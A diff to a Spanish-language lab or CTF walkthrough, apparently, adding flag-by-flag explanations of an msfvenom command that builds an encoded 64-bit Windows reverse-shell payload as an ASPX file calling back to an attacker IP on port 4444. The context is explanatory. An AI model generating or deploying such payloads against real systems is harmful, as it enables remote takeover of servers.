@@ -48,3 +48,10 @@ Utilizamos la extensión `.aspx` porque el servidor web está ejecutando IIS con
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.176.220 LPORT=4444 -e x64/shikata_ga_nai -f aspx -o shell.aspx
 ```
+
+- `-p windows/x64/shell_reverse_tcp`: Reverse shell de 64 bits.
+- `LHOST=192.168.176.220`: IP del atacante.
+- `LPORT=4444`: Puerto de escucha.
+- `-e x64/shikata_ga_nai`: Encoder utilizado para modificar el payload.
+- `-f aspx`: Formato de salida ASPX.
+- `-o shell.aspx`: Nombre del archivo de salida.
